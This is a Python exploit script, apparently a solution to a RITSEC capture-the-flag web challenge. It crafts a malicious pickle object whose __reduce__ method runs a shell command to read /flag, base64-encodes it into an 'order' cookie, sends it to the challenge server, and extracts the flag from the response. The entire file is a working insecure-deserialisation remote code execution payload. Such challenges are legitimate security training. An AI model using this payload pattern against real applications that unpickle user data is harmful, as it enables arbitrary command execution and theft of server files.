#!/usr/bin/env python3

import pickle
import base64
import requests
import re


class test:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['/bin/cat', '/flag'],))


p = pickle.dumps(test())
cookie = base64.b64encode(p).decode('ASCII')

url = 'https://pickles-web.challenges.ctf.ritsec.club/order'

cookies = {'order': cookie}

resp = requests.get(url, cookies=cookies)

flag_re = r'RS{.*}'

matches = re.findall(flag_re, resp.content.decode())
for match in matches:
    print(match)
